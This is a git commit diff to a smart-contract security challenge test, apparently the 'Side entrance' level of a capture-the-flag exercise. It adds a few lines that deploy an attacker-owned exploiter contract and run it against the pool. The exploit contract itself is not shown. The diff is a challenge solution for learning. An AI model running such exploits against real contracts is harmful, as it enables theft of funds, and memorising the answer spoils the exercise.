4f03c9c18a33354361ec7362d2291d2555e70100
0xToshii <94262432+0xToshii@users.noreply.github.com>
2022-08-21 18:21:43 -0700

    side-entrance

--- test/side-entrance/side-entrance.challenge.js
+++ test/side-entrance/side-entrance.challenge.js
@@ -25,6 +25,11 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        const Exploiter = await ethers.getContractFactory('SideEntranceExploiter', attacker)
+        this.exploiter = await Exploiter.deploy()
+        await this.exploiter.connect(attacker).runExploit(this.pool.address)
+
     });
 
     after(async function () {
